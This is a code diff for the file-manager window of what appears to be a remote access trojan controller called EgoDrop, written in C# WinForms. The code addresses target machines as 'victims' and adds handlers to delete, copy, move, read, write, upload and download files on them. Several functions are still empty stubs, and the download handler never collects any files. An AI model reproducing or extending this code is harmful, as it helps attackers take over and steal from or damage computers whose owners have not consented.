@@ -21,6 +21,17 @@ namespace EgoDrop
         private bool m_bIsUnixLike { get; set; }
         private bool m_bIsWindows { get { return !m_bIsUnixLike; } }
 
+        private string[] m_asWinShortCutDir =
+        {
+
+        };
+        private string[] m_asLinuxShortCutDir =
+        {
+
+        };
+
+        private List<stFileInfo> m_lsClipboard = new List<stFileInfo>();
+
         /// <summary>
         /// File information struct.
         /// Store the file information of remote file.
@@ -77,7 +88,11 @@ namespace EgoDrop
             m_victim = victim;
             m_szInitDir = string.Empty;
             m_bIsUnixLike = bUnixLike;
+
+            Text = $"FileMgr[{m_szVictimID}] | {(m_bIsUnixLike ? "Linux-like" : "Windows")}";
         }
+
+        private stFileInfo fnGetFileInfo(ListViewItem item) => item.Tag == null ? new stFileInfo() : (stFileInfo)item.Tag;
 
         /// <summary>
         /// Victim received message event handler.
@@ -216,29 +231,44 @@ namespace EgoDrop
                             TreeNode tnNode = fnAddTreeNodeByPath(szDirPath);
                             treeView1.SelectedNode = tnNode;
                         }
-                        else if (lsMsg[1] == "uf") //Upload file.
-                        {
-
-                        }
-                        else if (lsMsg[1] == "df") //Download file
-                        {
-
-                        }
-                        else if (lsMsg[1] == "wget") //WGET
-                        {
-
-                        }
                         else if (lsMsg[1] == "del") //Delete
                         {
+                            int nCode = int.Parse(lsMsg[2]);
+                            string szPath = lsMsg[3];
+                            string szMsg = lsMsg[4];
 
+                            if (nCode == 0)
+                                MessageBox.Show(szMsg, "DeleteFile", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            else
+                                MessageBox.Show($"Delete successfully: " + szPath, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         }
                         else if (lsMsg[1] == "cp") //Copy
                         {
+                            int nCode = int.Parse(lsMsg[2]);
+                            string szSrcPath = lsMsg[3];
+                            string szDstPath = lsMsg[4];
+                            string szMsg = lsMsg[5];
 
+                            if (nCode == 0)
+                                MessageBox.Show(szMsg, "CopyFile", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            else
+                                MessageBox.Show($"Copy file successfully:{szSrcPath} -> {szDstPath}", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                            fnRefresh();
                         }
                         else if (lsMsg[1] == "mv") //Move
                         {
+                            int nCode = int.Parse(lsMsg[2]);
+                            string szSrcPath = lsMsg[3];
+                            string szDstPath = lsMsg[4];
+                            string szMsg = lsMsg[5];
 
+                            if (nCode == 0)
+                                MessageBox.Show(szMsg, "MoveFile", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            else
+                                MessageBox.Show($"Move file successfully:{szSrcPath} -> {szDstPath}", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                            fnRefresh();
                         }
                         else if (lsMsg[1] == "nd") //New directory.
                         {
@@ -265,8 +295,13 @@ namespace EgoDrop
             }));
         }
 
-        private stFileInfo fnGetInfoStruct(ListViewItem item) => (stFileInfo)item.Tag;
-
+        /// <summary>
+        /// Find treeNode with specified absolute directory path.
+        /// </summary>
+        /// <param name="szPath">Directory's absolute path.</param>
+        /// <param name="treeNodeCollection">TreeNode collection.</param>
+        /// <param name="node">Node(For doing recurence(Null for calling).</param>
+        /// <returns></returns>
         private TreeNode fnFindTreeNodeByPath(string szPath, TreeNodeCollection treeNodeCollection, TreeNode node = null)
         {
             if (string.IsNullOrEmpty(szPath) || treeNodeCollection.Count == 0)
@@ -288,6 +323,11 @@ namespace EgoDrop
             return node;
         }
 
+        /// <summary>
+        /// Add path recursively(Windows).
+        /// </summary>
+        /// <param name="szPath">Directory absolute path.</param>
+        /// <returns></returns>
         private TreeNode fnWinAddTreeNodeByPath(string szPath)
         {
             TreeNode fnRecursive(TreeNode node, string szRelativePath)
@@ -369,7 +409,11 @@ namespace EgoDrop
             return fnRecursive(driveNode, relativePath);
         }
 
-
+        /// <summary>
+        /// Add path recursively(Unix-like).
+        /// </summary>
+        /// <param name="szPath">Directory absolute path.</param>
+        /// <returns></returns>
         private TreeNode fnAddTreeNodeByPath(string szPath)
         {
             TreeNode fnRecursive(TreeNode node, string szRelativePath)
@@ -452,6 +496,13 @@ namespace EgoDrop
             }
         }
 
+        #region Functions
+
+        /// <summary>
+        /// Write text into specified file.
+        /// </summary>
+        /// <param name="szFilePath">File path.</param>
+        /// <param name="szContent">Text content.</param>
         public void fnWriteFile(string szFilePath, string szContent)
         {
             m_victim.fnSendCommand(m_szVictimID, new string[]
@@ -463,6 +514,10 @@ namespace EgoDrop
             });
         }
 
+        /// <summary>
+        /// Read file from specified file's absolute path.
+        /// </summary>
+        /// <param name="szFilePath">File path.</param>
         public void fnReadFile(string szFilePath)
         {
             frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(m_victim, m_szVictimID);
@@ -484,6 +539,10 @@ namespace EgoDrop
             });
         }
 
+        /// <summary>
+        /// Goto specified directory.
+        /// </summary>
+        /// <param name="szDirPath">Directory's absolute path.</param>
         public void fnGoto(string szDirPath)
         {
             m_victim.fnSendCommand(m_szVictimID, new string[]
@@ -493,6 +552,41 @@ namespace EgoDrop
                 szDirPath,
             });
         }
+
+        /// <summary>
+        /// Refresh current file explorer.
+        /// </summary>
+        public void fnRefresh()
+        {
+            if (textBox1.Tag == null)
+                return;
+
+            string szCurrentPath = (string)textBox1.Tag;
+            if (string.IsNullOrEmpty(szCurrentPath))
+                return;
+
+            fnGoto(szCurrentPath);
+        }
+
+
+        public void fnCopy(string szSrcEntity, string szDstEntity, bool bIsDir)
+        {
+
+        }
+
+
+        public void fnMove(string szSrcEntity, string szDstEntity, bool bIsDir)
+        {
+
+        }
+
+
+        public void fnDelete(string szPath, bool bIsDir)
+        {
+
+        }
+
+        #endregion
 
         private void fnSetup()
         {
@@ -522,7 +616,7 @@ namespace EgoDrop
             if (item == null)
                 return;
 
-            stFileInfo info = fnGetInfoStruct(item);
+            stFileInfo info = fnGetFileInfo(item);
             if (info.bDirectory)
             {
                 TreeNode node = fnFindTreeNodeByPath(info.szFilePath, treeView1.Nodes);
@@ -547,7 +641,7 @@ namespace EgoDrop
         private void toolStripMenuItem11_Click(object sender, EventArgs e)
         {
             List<string> lsImage = listView1.Items.Cast<ListViewItem>().ToList()
-                .Select(x => fnGetInfoStruct(x))
+                .Select(x => fnGetFileInfo(x))
                 .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
                 .Select(x => x.szFilePath)
                 .ToList();
@@ -569,7 +663,7 @@ namespace EgoDrop
         private void toolStripMenuItem12_Click(object sender, EventArgs e)
         {
             List<string> lsImage = listView1.SelectedItems.Cast<ListViewItem>().ToList()
-                .Select(x => fnGetInfoStruct(x))
+                .Select(x => fnGetFileInfo(x))
                 .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
                 .Select(x => x.szFilePath)
                 .ToList();
@@ -630,12 +724,14 @@ namespace EgoDrop
 
         private void toolStripMenuItem3_Click(object sender, EventArgs e)
         {
-            ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();
-            if (item == null)
-                return;
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                stFileInfo info = fnGetFileInfo(item);
+                if (info.bDirectory)
+                    continue;
 
-            stFileInfo info = fnGetInfoStruct(item);
-            fnReadFile(info.szFilePath);
+                fnReadFile(info.szFilePath);
+            }
         }
 
         //New.Folder
@@ -693,13 +789,40 @@ namespace EgoDrop
         //Upload
         private void toolStripMenuItem8_Click(object sender, EventArgs e)
         {
+            OpenFileDialog ofd = new OpenFileDialog();
+            ofd.Multiselect = true;
 
+            if (ofd.ShowDialog() == DialogResult.OK)
+            {
+                List<string> lsFile = ofd.FileNames.ToList();
+
+                frmFileTransfer f = new frmFileTransfer(m_victim, lsFile, frmFileTransfer.enTransfer.Upload);
+                f.Show();
+            }
         }
 
         //Download
         private void toolStripMenuItem9_Click(object sender, EventArgs e)
         {
+            List<string> lsFile = new List<string>();
+            bool bWarning = false;
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                var stInfo = fnGetFileInfo(item);
+                if (stInfo.bDirectory)
+                {
+                    if (!bWarning)
+                    {
+                        MessageBox.Show("Source entities contain folder, they will not be included.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        bWarning = true;
+                    }
 
+                    continue;
+                }
+            }
+
+            frmFileTransfer f = new frmFileTransfer(m_victim, lsFile, frmFileTransfer.enTransfer.Download);
+            f.Show();
         }
 
         //WGET
@@ -719,6 +842,19 @@ namespace EgoDrop
         private void toolStripMenuItem18_Click(object sender, EventArgs e)
         {
 
+        }
+
+        //ParentNode
+        private void toolStripButton1_Click(object sender, EventArgs e)
+        {
+            TreeNode node = fnFindTreeNodeByPath(m_szCurrentPath, treeView1.Nodes);
+            if (node == null)
+                return;
+
+            if (node.Parent == null)
+                return;
+
+            treeView1.SelectedNode = node.Parent;
         }
     }
 }
